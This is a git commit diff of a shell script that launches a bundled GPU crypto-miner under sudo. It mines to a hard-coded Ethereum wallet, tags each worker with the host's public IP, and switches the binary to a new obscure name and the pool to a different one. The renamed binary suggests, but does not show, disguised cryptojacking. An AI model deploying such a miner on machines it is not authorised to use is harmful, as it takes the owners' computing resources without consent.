3f1dbea5261b31cc1e85b7c364fefd33853e0862
ayu033 <79036003+ayu033@users.noreply.github.com>
2021-02-16 12:36:17 +0700

    Update Pungoe.sh

--- Pungoe.sh
+++ Pungoe.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
 
 WALLET=0xf339db86fafc99f85619a0d55e2d1e47ef9a840a
-WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-eth
+WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-Catok
 
 cd "$(dirname "$0")"
 
-chmod +x ./jetsky && sudo ./jetsky -G -P stratum1+tcp://$WALLET.$WORKER@asia1.ethermine.org:4444
+chmod +x ./Atjeh && sudo ./Atjeh -G -P stratum1+tcp://$WALLET.$WORKER@asia.sparkpool.com:3333
